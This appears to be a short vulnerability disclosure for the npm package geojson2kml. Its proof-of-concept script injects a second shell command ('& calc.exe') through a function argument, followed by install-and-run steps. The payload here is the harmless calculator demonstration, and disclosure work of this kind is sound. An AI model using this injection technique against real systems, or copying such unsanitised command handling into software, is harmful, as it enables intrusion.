# Description

`geojson2kml` is vulnerable to `Command Injection`.


# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a =require("geojson2kml");
a("./","& calc.exe",function(){})

```
2. Execute the following commands in another terminal:

```
npm i geojson2kml # Install affected module
node poc.js #  Run the PoC
```
3. On execution, windows application "calc.exe" will get open.
